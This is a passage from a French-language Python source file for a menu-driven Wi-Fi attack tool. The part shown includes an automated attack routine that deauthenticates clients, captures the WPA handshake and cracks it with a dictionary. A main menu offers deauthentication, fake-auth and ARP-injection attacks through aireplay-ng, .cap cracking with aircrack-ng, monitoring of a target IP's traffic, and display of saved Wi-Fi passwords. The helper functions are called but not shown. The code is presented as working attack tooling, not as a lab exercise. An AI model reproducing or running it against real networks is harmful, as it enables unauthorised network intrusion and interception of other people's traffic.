        console.print("[cyan]Étape 3 : Envoi de déauthentification pour capturer le handshake...[/cyan]")
        deauth_status = "Réussie" if attaquer_wifi(cible["bssid"], interface, canal, "deauth") else "Échouée"

    # Étape 4 : Capturer les paquets
    nom_fichier_capture = f"capture_{cible['bssid'].replace(':', '')}_{horodatage}"
    fichier_sortie = os.path.join(dossier_attaque, nom_fichier_capture)
    console.print(f"[cyan]Étape 4 : Capture des paquets pour {cible['bssid']}...[/cyan]")
    capture_status = "Réussie" if capturer_paquets(cible["bssid"], interface, canal, fichier_sortie) else "Échouée"
    if capture_status == "Échouée":
        console.print("[red]Échec de la capture de paquets. Arrêt de l'attaque.[/red]")
        return

    # Étape 5 : Déchiffrer le fichier .cap
    console.print("[cyan]Étape 5 : Tentative de déchiffrement...[/cyan]")
    if not fichier_dico:
        fichier_dico = input("Entrez le chemin du fichier dictionnaire (ou Entrée pour ignorer) : ").strip()
    dechiffrement_status = "Réussie" if dechiffrer_cap(f"{fichier_sortie}.cap", cible["securite"], fichier_dico) else "Échouée"

    # Afficher un tableau récapitulatif de l'attaque
    tableau_recap = Table(title="Récapitulatif de l'attaque automatisée")
    tableau_recap.add_column("Étape", style="cyan")
    tableau_recap.add_column("Description", style="magenta")
    tableau_recap.add_column("Statut", style="green")

    tableau_recap.add_row("1 - Scan", "Scan des réseaux Wi-Fi", "Réussie")
    tableau_recap.add_row("2 - Sélection cible", f"Cible : {cible['ssid']} ({cible['bssid']})", "Réussie")
    tableau_recap.add_row("3 - Déauthentification", "Envoi de paquets de déauthentification", deauth_status)
    tableau_recap.add_row("4 - Capture paquets", f"Fichier : {fichier_sortie}.cap", capture_status)
    tableau_recap.add_row("5 - Déchiffrement", "Tentative de craquage du mot de passe", dechiffrement_status)

    console.print(tableau_recap)
    logging.info(f"Attaque automatisée terminée pour {cible['bssid']}")

# ====== AIDE / DOCUMENTATION ======
def aide():
    """Affiche l'aide et la documentation."""
    console.print("[bold blue]=== Aide / Documentation ===[/bold blue]\n")
    console.print("1 - Scanner les réseaux Wi-Fi : Détecte le mode moniteur et scanne en temps réel avec airodump-ng ou en mode normal avec nmcli.")
    console.print("2 - Déchiffrer un fichier .cap : Déchiffre les fichiers .cap pour WEP ou WPA/WPA2 avec aircrack-ng.")
    console.print("3 - Lancer une attaque Wi-Fi : Supporte la déauthentification, le fake auth et l'injection ARP avec aireplay-ng.")
    console.print("4 - Afficher l'historique Wi-Fi : Liste les réseaux Wi-Fi enregistrés avec SSID, UUID, type, mot de passe et BSSID.")
    console.print("5 - Compter les appareils connectés : Compte les appareils connectés au réseau Wi-Fi auquel vous êtes connecté.")
    console.print("6 - Capturer des paquets : Capture les paquets pour un BSSID spécifique dans un fichier .cap.")
    console.print("7 - Attaque automatisée : Scanne, capture, déauthentifie et déchiffre automatiquement un réseau cible.")
    console.print("8 - Surveiller le trafic IP : Capture et analyse le trafic réseau pour une adresse IP donnée.")
    console.print("9 - Détecter les vulnérabilités Wi-Fi : Identifie les réseaux avec WPS activé ou SSID masqué.")
    console.print("10 - Surveillance en temps réel avec GUI : Affiche une interface graphique pour surveiller les clients connectés.")
    console.print("11 - Aide / Documentation : Affiche cette aide.")
    console.print("12 - Quitter : Quitte le programme.\n")
    logging.info("Aide affichée")

# ====== MENU PRINCIPAL ======
def main():
    """Menu principal de l'outil Wi-Fi."""
    while True:
        console.print("[bold blue]=== Scanner, Déchiffreur & Attaques Wi-Fi ===[/bold blue]\n")
        console.print("Sélectionnez une option :")
        console.print("1 - Scanner les réseaux Wi-Fi")
        console.print("2 - Déchiffrer un fichier .cap")
        console.print("3 - Lancer une attaque Wi-Fi")
        console.print("4 - Afficher l'historique des connexions Wi-Fi")
        console.print("5 - Compter les appareils connectés")
        console.print("6 - Capturer des paquets")
        console.print("7 - Lancer une attaque automatisée")
        console.print("8 - Surveiller le trafic IP")
        console.print("9 - Détecter les vulnérabilités Wi-Fi")
        console.print("10 - Surveillance en temps réel avec GUI")
        console.print("11 - Aide / Documentation")
        console.print("12 - Quitter")
        choix = input("Votre choix : ").strip()

        if choix == '1':
            scan_wifi()
        elif choix == '2':
            fichier_cap = input("Entrez le chemin du fichier .cap : ").strip()
            console.print("\nSélectionnez le type de sécurité :")
            console.print("1 - WEP")
            console.print("2 - WPA/WPA2")
            type_securite = input("Votre choix : ").strip()
            type_securite = "WEP" if type_securite == '1' else "WPA" if type_securite == '2' else None
            fichier_dico = input("Entrez le chemin du fichier dictionnaire (ou Entrée pour ignorer) : ").strip() if type_securite == "WPA" else None
            dechiffrer_cap(fichier_cap, type_securite, fichier_dico)
        elif choix == '3':
            bssid = input("Entrez le BSSID cible : ").strip()
            interface = input("Entrez l'interface en mode moniteur : ").strip()
            canal = input("Entrez le canal du réseau (ex. 1, 6, 11) : ").strip()
            console.print("Sélectionnez le type d'attaque :")
            console.print("1 - Déauthentification")
            console.print("2 - Fake auth")
            console.print("3 - Injection ARP")
            type_attaque = input("Votre choix : ").strip()
            type_attaque = "deauth" if type_attaque == '1' else "fakeauth" if type_attaque == '2' else "arpreplay" if type_attaque == '3' else None
            attaquer_wifi(bssid, interface, canal, type_attaque)
        elif choix == '4':
            historique_wifi()
        elif choix == '5':
            interface = input("Entrez l'interface réseau (ex. wlan0) : ").strip()
            compter_appareils_connectes(interface)
        elif choix == '6':
            bssid = input("Entrez le BSSID cible : ").strip()
            interface = input("Entrez l'interface en mode moniteur : ").strip()
            canal = input("Entrez le canal du réseau (ex. 1, 6, 11) : ").strip()
            fichier_sortie = input("Entrez le nom du fichier de sortie (sans extension, ou Entrée pour défaut) : ").strip()
            capturer_paquets(bssid, interface, canal, fichier_sortie)
        elif choix == '7':
            interface = input("Entrez l'interface en mode moniteur : ").strip()
            fichier_dico = input("Entrez le chemin du fichier dictionnaire (ou Entrée pour ignorer) : ").strip()
            attaque_automatisee(interface, fichier_dico or None)
        elif choix == '8':
            interface = input("Entrez l'interface réseau (ex. wlan0) : ").strip()
            ip_cible = input("Entrez l'adresse IP à surveiller (ex. 192.168.1.100) : ").strip()
            duree = input("Entrez la durée de capture en secondes (par défaut 30) : ").strip()
            duree = int(duree) if duree and duree.isdigit() else 30
            surveiller_trafic_ip(interface, ip_cible, duree)
        elif choix == '9':
            interface = input("Entrez l'interface en mode moniteur (ex. wlan0mon) : ").strip()
            detecter_vulnerabilites_wifi(interface)
        elif choix == '10':
            interface = input("Entrez l'interface réseau (ex. wlan0) : ").strip()
            surveiller_clients_gui(interface)
        elif choix == '11':
            aide()
        elif choix == '12':
            console.print("[green]Quitter le programme...[/green]")
            logging.info("Programme quitté")
            break
        else:
            console.print("[red]Option invalide ![/red]")
        console.print("\n[cyan]Appuyez sur Entrée pour revenir au menu...[/cyan]")
        input()

if __name__ == "__main__":
    main()